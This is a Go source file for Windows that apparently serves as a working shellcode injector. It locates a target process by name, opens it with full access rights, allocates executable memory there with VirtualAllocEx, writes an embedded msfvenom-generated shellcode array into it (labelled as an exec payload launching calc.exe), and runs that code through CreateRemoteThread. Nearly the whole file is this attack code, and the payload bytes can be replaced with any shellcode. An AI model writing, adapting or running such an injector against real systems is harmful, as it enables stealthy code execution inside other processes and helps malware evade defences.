package main

import "os"
import "fmt"
import "syscall"
import "unsafe"
import "strings"
import "unicode/utf8"


func OpenProcess(processAccess int, bInheritHandle int, processId uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("OpenProcess").Call(
      uintptr(processAccess),
      uintptr(bInheritHandle),
      uintptr(processId),
   )
   return uintptr(ret)
}


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func CreateRemoteThread(hProcess uintptr, lpThreadAttributes uintptr, dwStackSize uint64, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateRemoteThread").Call(
      uintptr(hProcess),
      uintptr(lpThreadAttributes),
      uintptr(dwStackSize),
      uintptr(lpStartAddress),
      uintptr(lpParameter),
      uintptr(dwCreationFlags),
      uintptr(lpThreadId),      
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func NtGetNextProcess(handle uintptr, MAX_ALLOWED int, param3 int, param4 int, outHandle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("ntdll.dll").NewProc("NtGetNextProcess").Call(
      uintptr(handle),
      uintptr(MAX_ALLOWED),
      uintptr(param3),
      uintptr(param4),
      uintptr(outHandle),
   )
   return uintptr(ret)
}


func GetProcessImageFileName(hProcess uintptr, lpImageFileName uintptr, nSize int) uintptr {
   ret, _, _ := syscall.NewLazyDLL("psapi.dll").NewProc("GetProcessImageFileNameA").Call(
      uintptr(hProcess),
      uintptr(lpImageFileName),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func GetProcessId(handle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessId").Call(
      uintptr(handle),
   )
   return uintptr(ret)
}


func Reverse(s string) string {
    size := len(s)
    buf := make([]byte, size)
    for start := 0; start < size; {
        r, n := utf8.DecodeRuneInString(s[start:])
        start += n
        utf8.EncodeRune(buf[size-start:], r)
    }
    return string(buf)
}


func GetProcessByName(process_name string) []uintptr{
   var proc_handles_slice []uintptr;
   var MAXIMUM_ALLOWED int = 0x02000000;
   var s uintptr = 0;
   for {
      if (NtGetNextProcess(s, MAXIMUM_ALLOWED, 0, 0, uintptr(unsafe.Pointer(&s))) != 0) { break }

      buf := [256]byte{}
      var mem_address uintptr = uintptr(unsafe.Pointer(&buf[0])); 
      var res uintptr = GetProcessImageFileName(s, mem_address, len(buf));

      if (res > 1){
         var res_string string = string(buf[0:res]);
         var reverted_string string = Reverse(res_string);
         var index int = strings.Index(reverted_string, "\\");
         var result_name string = Reverse(reverted_string[0:index]);
         if (result_name == process_name){
            // fmt.Println("[+] Process handle: \t", s, "(", fmt.Sprintf("0x%x", s), ")");
            // fmt.Println("[+] Process name:   \t", process_name);
            proc_handles_slice = append(proc_handles_slice, s);
         }
      }
   }
   return proc_handles_slice;
}


func main() {
   process_name := os.Args[1]
   var proc_handles_slice []uintptr = GetProcessByName(process_name);
   var first_proc = proc_handles_slice[0];
   var pid uintptr = GetProcessId(first_proc);
   fmt.Println("[+] Process PID: \t\t", pid);

   // OpenProcess
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, 0x1000, 0x3000, 0x40);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   // Payload: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp -b "\x00\x0a\x0d" exitfunc=thread
   buf := []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0x73,0x1f,0x6e,0xa3,0xdb,0x17,0xd6,0x07,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x8f,0x57,0xed,0x47,0x2b,0xff,0x16,0x07,0x73,0x1f,0x2f,0xf2,0x9a,0x47,0x84,0x56,0x25,0x57,0x5f,0x71,0xbe,0x5f,0x5d,0x55,0x13,0x57,0xe5,0xf1,0xc3,0x5f,0x5d,0x55,0x53,0x57,0xe5,0xd1,0x8b,0x5f,0xd9,0xb0,0x39,0x55,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x23,0x0f,0xdf,0xd9,0x3b,0xf6,0x46,0xb2,0xd6,0x63,0xe2,0xda,0xd6,0x34,0xea,0x21,0x5e,0x3f,0xeb,0x50,0x45,0xf6,0x8c,0x31,0x23,0x26,0xa2,0x0b,0x9c,0x56,0x8f,0x73,0x1f,0x6e,0xeb,0x5e,0xd7,0xa2,0x60,0x3b,0x1e,0xbe,0xf3,0x50,0x5f,0xce,0x43,0xf8,0x5f,0x4e,0xea,0xda,0xc7,0x35,0x51,0x3b,0xe0,0xa7,0xe2,0x50,0x23,0x5e,0x4f,0x72,0xc9,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x5e,0xaf,0x6a,0xd6,0x56,0xd7,0xc6,0x4b,0xff,0x1b,0x52,0x97,0x14,0x9a,0x23,0x7b,0x5a,0x57,0x72,0xae,0xcf,0x8e,0x43,0xf8,0x5f,0x4a,0xea,0xda,0xc7,0xb0,0x46,0xf8,0x13,0x26,0xe7,0x50,0x57,0xca,0x4e,0x72,0xcf,0x2f,0x28,0xdf,0x9f,0x9e,0x06,0xa3,0x5e,0x36,0xe2,0x83,0x49,0x8f,0x5d,0x32,0x47,0x2f,0xfa,0x9a,0x4d,0x9e,0x84,0x9f,0x3f,0x2f,0xf1,0x24,0xf7,0x8e,0x46,0x2a,0x45,0x26,0x28,0xc9,0xfe,0x81,0xf8,0x8c,0xe0,0x33,0xeb,0x61,0x16,0xd6,0x07,0x73,0x1f,0x6e,0xa3,0xdb,0x5f,0x5b,0x8a,0x72,0x1e,0x6e,0xa3,0x9a,0xad,0xe7,0x8c,0x1c,0x98,0x91,0x76,0x60,0xf7,0xcb,0x2d,0x79,0x5e,0xd4,0x05,0x4e,0xaa,0x4b,0xf8,0xa6,0x57,0xed,0x67,0xf3,0x2b,0xd0,0x7b,0x79,0x9f,0x95,0x43,0xae,0x12,0x6d,0x40,0x60,0x6d,0x01,0xc9,0xdb,0x4e,0x97,0x8e,0xa9,0xe0,0xbb,0xc0,0xba,0x7b,0xb5,0x29,0x16,0x67,0x0b,0xa3,0xdb,0x17,0xd6,0x07}
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);


   // CreateRemoteThread
   res = CreateRemoteThread(proc_handle, 0, 0, assigned_address, 0, 0, 0);
   if (res == 0){
      fmt.Println("[-] CreateRemoteThread API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Created thread id: \t\t", res);
   
   // CloseHandle
   CloseHandle(proc_handle);
}